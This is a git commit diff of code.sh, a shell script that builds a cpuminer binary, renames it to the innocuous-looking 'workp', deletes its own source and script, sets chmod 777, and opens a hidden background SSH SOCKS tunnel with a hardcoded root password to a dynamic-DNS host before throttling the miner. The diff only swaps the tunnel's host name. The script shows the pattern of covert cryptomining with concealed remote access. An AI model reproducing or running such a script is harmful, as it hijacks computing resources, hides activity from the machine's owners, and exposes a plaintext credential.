24668c45a56706f601ef7e4f755a04e7171234e4
hungminer <45831070+hungminer@users.noreply.github.com>
2019-01-04 01:05:54 +0700

    Update code.sh

--- code.sh
+++ code.sh
@@ -5,4 +5,4 @@ cd hungminer1
 chmod +x *
 ./build.sh
 make
-mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf hungminer1 code.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp --limit 200 -b
+mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf hungminer1 code.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@hungminer.ddns.net && cpulimit --exe workp --limit 200 -b
